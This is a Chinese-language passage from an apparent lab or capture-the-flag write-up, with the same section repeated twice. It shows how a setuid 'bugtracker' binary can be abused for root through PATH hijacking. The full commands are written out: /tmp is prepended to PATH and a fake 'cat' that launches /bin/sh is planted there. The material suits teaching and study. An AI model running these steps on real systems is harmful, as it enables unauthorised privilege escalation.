这个程序会`cat`一个路径并将内容输出，不存在的编号会显示无文件。可以利用这个点进行提权。

**思路**：`bugtracker`本无权进入`root`目录，但使用了setid，使其暂时拥有root权限并调用`cat`命令。直接调用`cat`时，调用的是环境变量中的`cat`。我们可以构造一个恶意的`cat`命令，并将该命令所在目录设置为环境变量，这样`bugtracker`调用的就是恶意`cat`。具体命令如下：

```bash
export PATH=/tmp:$PATH //将 /tmp 目录设置为环境变量
cd /tmp/ //切换到 /tmp 目录下
echo '/bin/sh' > cat //在此构造恶意的 cat 命令
chmod +x cat //赋予执行权限
```

然后调用`bugtracker`，输入任意ID都会直接调用root用户的shell：

![](upload/attach/202203/905780\_WVM5UEVTFV7DYH6.jpg)

由于我们修改了环境变量，调用的`cat`是恶意的，所以无法查看文件。这里使用`tac`命令查看（`tac`是将行数倒着输出，而不是将每个字符倒序输出），直接`tac`查看即可：

![](upload/attach/202203/905780\_3J855SGZPVBZRZP.jpg)

**思路**：`bugtracker`本来无权进入`root`目录的，但是使用了`setid`，使`bugtracker`暂时拥有了`root`权限，并且调用`cat`命令，直接调用`cat`命令调的是环境变量中的`cat`，那我们做一个恶意的`cat`命令，再把这个恶意的`cat`命令所在文件夹设置为环境变量，那`bugtracker`调用的就是恶意`cat`，具体命令如下：

|  |  |
| --- | --- |
| 1  2  3  4 | `export PATH=/tmp:$PATH` `//将/tmp目录设置为环境变量`  `cd /tmp/`                            `//切换到/tmp目录下`  `echo '/bin/sh' > cat` `//在此构造恶意的cat命令`  `chmod +x cat` `//赋予执行权限` |

然后调用`bugtracker`，输入任何一个`id`都会直接调用`root`用户的`shell`

![](https://bbs.kanxue.com/upload/attach/202203/905780_WVM5UEVTFV7DYH6.jpg)

因为，我们修改了环境变量，所以调用的`cat`是恶意的，所以查看不了文件，这里使用`tac`命令查看。`tac`是将行数倒着输出，并不会将一句话的每个字符倒序输出，这里直接`tac`查看即可
